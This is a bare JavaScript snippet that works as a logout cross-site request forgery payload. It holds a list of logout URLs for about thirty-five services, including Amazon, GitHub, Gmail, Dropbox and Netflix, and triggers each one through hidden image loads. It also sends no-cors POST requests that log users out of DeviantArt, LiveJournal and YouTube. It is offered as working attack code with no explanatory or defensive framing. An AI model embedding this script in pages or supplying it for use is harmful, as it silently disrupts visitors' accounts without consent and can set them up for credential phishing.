const getLogouts = [
    "http://www.amazon.com/gp/flex/sign-out.html?action=sign-out", "http://www.blogger.com/logout.g", "http://www.delicious.com/logout", 
    "https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout", "https://www.dropbox.com/logout", "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn", 
    "https://www.gandi.net/login/out", "https://github.com/logout", "http://mail.google.com/mail/?logout", "https://www.google.com/accounts/Logout", 
    "https://secure.hulu.com/logout", "http://www.instapaper.com/user/logout", "https://manager.linode.com/session/logout", 
    "http://www.myspace.com/index.cfm?fuseaction=signout", "http://www.netflix.com/Logout", "http://www.nytimes.com/logout", 
    "https://secure.newegg.com/NewMyAccount/AccountLogout.aspx", "http://photobucket.com/logout", "https://secure.skype.com/account/logout", 
    "http://slashdot.org/my/logout", "http://soundcloud.com/logout", "http://steamcommunity.com/?action=doLogout", "http://store.steampowered.com/logout/", 
    "https://www.thinkgeek.com/brain/account/login.cgi?a=lo", "http://www.threadless.com/logout", "http://www.tumblr.com/logout", "http://vimeo.com/log_out", 
    "http://en.wikipedia.org/w/index.php?title=Special:UserLogout", "http://login.live.com/logout.srf", "https://account.woot.com/logout", 
    "https://wordpress.com/wp-login.php?action=logout", "https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/"
];
getLogouts.forEach(url => new Image().src = url);
const postLogouts = [
    ["http://www.deviantart.com/users/logout", null], ["http://www.livejournal.com/logout.bml", "action:killall=1"], ["http://www.youtube.com", "action_logout=1"]
];
postLogouts.forEach(([url, body]) => {
    fetch(url, { method: 'POST', body, mode: 'no-cors' }).catch(() => {});
});